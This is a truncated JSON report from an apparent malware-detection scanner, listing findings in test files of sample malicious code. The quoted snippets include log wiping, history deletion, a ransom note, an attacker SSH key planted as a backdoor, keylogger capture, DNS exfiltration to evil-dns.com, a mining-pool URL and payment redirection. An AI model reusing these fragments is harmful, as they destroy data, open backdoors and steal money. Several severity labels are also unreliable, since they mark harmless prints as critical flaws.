{
  "coverage": "100%",
  "duration_ms": 70,
  "files_scanned": 5,
  "issues": [
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "subprocess.call(['rm', '-rf', '/var/log/*'])",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.199791",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "5f44e6dc-1a7c-4941-b474-ec2667908ee5",
      "last_modified": "",
      "line_number": 234,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T21:14:32.199791"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "os.remove('/home/user/.bash_history')",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.200791",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "6e7177e2-2c43-4ec8-8f31-1c44e3ae6baf",
      "last_modified": "",
      "line_number": 237,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "File/directory deletion - Data loss risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected - User-specific condition detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T21:14:32.200791"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "os.remove(file_path)",
      "column": 17,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.202797",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "4e318b25-a964-4c5f-8875-fe9d869357a1",
      "last_modified": "",
      "line_number": 357,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "File/directory deletion - Data loss risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T21:14:32.202797"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "To decrypt your files, you need to pay 0.5 Bitcoin to the following address:",
      "column": 48,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.207810",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "ff0d405c-fc96-4bdc-a340-8ff4e2921b6e",
      "last_modified": "",
      "line_number": 373,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T21:14:32.207810"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "ssh_key = \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... attacker@evil.com\"",
      "column": 9,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.209805",
      "data_classification": "UNKNOWN",
      "debt_category": "SECURITY_ISSUE",
      "effort": 30,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "da8f8ae5-4d4e-49a8-b0ca-c1deccb9c586",
      "last_modified": "",
      "line_number": 95,
      "message": "Detects hardcoded passwords, API keys, and secrets",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-secrets-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Move secrets to environment variables or secure vault services.",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "VULNERABILITY",
      "update_date": "2025-08-11T21:14:32.209805"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "High",
      "code_snippet": "ssh_key = \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... attacker@evil.com\"",
      "column": 9,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.211790",
      "data_classification": "UNKNOWN",
      "debt_category": "HARDCODED_CREDENTIALS",
      "effort": 45,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "63b07feb-0806-4599-a05b-7787448168ac",
      "last_modified": "",
      "line_number": 95,
      "message": "Detects hardcoded passwords, API keys, and secrets in code",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-credentials",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T21:14:32.211790"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "High",
      "code_snippet": "ssh.connect('victim-server.com', username='root', key_filename='backdoor_key')",
      "column": 55,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.212790",
      "data_classification": "UNKNOWN",
      "debt_category": "HARDCODED_CREDENTIALS",
      "effort": 45,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "90d7e95f-ed61-42f6-a356-b12e23be690c",
      "last_modified": "",
      "line_number": 102,
      "message": "Detects hardcoded passwords, API keys, and secrets in code",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-credentials",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern - User-specific condition detected",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T21:14:32.212790"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "High",
      "code_snippet": "recent_keys = ''.join(captured_keys[-20:])",
      "column": 16,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.213808",
      "data_classification": "UNKNOWN",
      "debt_category": "HARDCODED_CREDENTIALS",
      "effort": 45,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "e03a23b9-13b1-4743-85ad-867dde4233c3",
      "last_modified": "",
      "line_number": 459,
      "message": "Detects hardcoded passwords, API keys, and secrets in code",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-credentials",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T21:14:32.213808"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "High",
      "code_snippet": "password_data = ''.join(captured_keys[-50:])",
      "column": 13,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.213808",
      "data_classification": "UNKNOWN",
      "debt_category": "HARDCODED_CREDENTIALS",
      "effort": 45,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "0bc0f4b7-7728-4f93-9fe6-055542959f76",
      "last_modified": "",
      "line_number": 462,
      "message": "Detects hardcoded passwords, API keys, and secrets in code",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-credentials",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T21:14:32.213808"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "app.run(host='0.0.0.0', port=80)",
      "column": 13,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.214791",
      "data_classification": "UNKNOWN",
      "debt_category": "HARDCODED_URLS",
      "effort": 30,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "8bd793b2-9b57-4603-8bf4-d1d564873b04",
      "last_modified": "",
      "line_number": 119,
      "message": "Detects hardcoded URLs and connection strings",
      "payload_analysis": "Unknown payload - MAJOR level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-urls",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "MAJOR",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T21:14:32.214791"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "pool_url = \"stratum+tcp://xmr-pool.com:4444\"",
      "column": 10,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.215809",
      "data_classification": "UNKNOWN",
      "debt_category": "HARDCODED_URLS",
      "effort": 30,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "9c985996-6c7a-4b78-979a-872885517da9",
      "last_modified": "",
      "line_number": 251,
      "message": "Detects hardcoded URLs and connection strings",
      "payload_analysis": "Unknown payload - MAJOR level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-urls",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "MAJOR",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T21:14:32.215809"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "dns_query = f\"data.{encoded_data[:32]}.evil-dns.com\"",
      "column": 17,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.216809",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "22d2800a-55bf-46c6-a9b5-0167c6469753",
      "last_modified": "",
      "line_number": 34,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T21:14:32.216809"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "f.write(f\"\\n{ssh_key}\\n\")",
      "column": 17,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.216809",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "cf1fb796-c9e3-4fde-8c70-4dd7e7266c10",
      "last_modified": "",
      "line_number": 97,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T21:14:32.216809"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "data = f\"block_data_{nonce}\".encode()",
      "column": 24,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.217793",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "0b605d24-21b8-471b-8e71-535896081be1",
      "last_modified": "",
      "line_number": 262,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T21:14:32.217793"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "for file_path in glob.glob(f'/**/{ext}', recursive=True):",
      "column": 36,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.218793",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "86c08128-6d40-468b-82ee-fdf7d7699d26",
      "last_modified": "",
      "line_number": 343,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T21:14:32.218793"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "print(f\"{ip}: {open_ports}\")",
      "column": 19,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.219793",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "6155faad-aea7-4eba-b7d2-718fe29bbaf3",
      "last_modified": "",
      "line_number": 513,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T21:14:32.219793"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "ip = f\"{network}.{i}\"",
      "column": 14,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.219793",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "0e0ac84a-db2f-4cc0-8a67-35c9bc0a58ec",
      "last_modified": "",
      "line_number": 519,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T21:14:32.219793"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "full_domain = f\"{sub}.{domain}\"",
      "column": 27,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.219793",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "f51e6e70-1e86-44c1-889c-49ae568d6074",
      "last_modified": "",
      "line_number": 558,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T21:14:32.219793"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "print(f\"Found: {full_domain} -> {ip}\")",
      "column": 19,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.220791",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "e75ea204-338c-4b40-a43c-008c4a25f39c",
      "last_modified": "",
      "line_number": 560,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T21:14:32.220791"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "print(f\"SNMP access with community: {community}\")",
      "column": 27,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.220791",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "f9de1602-3df8-4a95-a704-1c516fb60d4e",
      "last_modified": "",
      "line_number": 586,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T21:14:32.220791"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "# FRAUD: Redirect payments over $1000 to developer account",
      "column": 14,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.237794",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "2c1e4a73-faf9-4474-b55e-eb86c82bf341",
      "last_modified": "",
      "line_number": 11,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected - Counter-based logic found",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T21:14:32.237794"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "transfer_crypto(amount, developer_wallet)",
      "column": 14,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.237794",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "c68126ec-5e6c-4fe8-a9f6-e4cf6dfab67a",
      "last_modified": "",
      "line_number": 76,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T21:14:32.237794"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "# Redirect payments to admin account during off-hours",
      "column": 15,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.238800",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
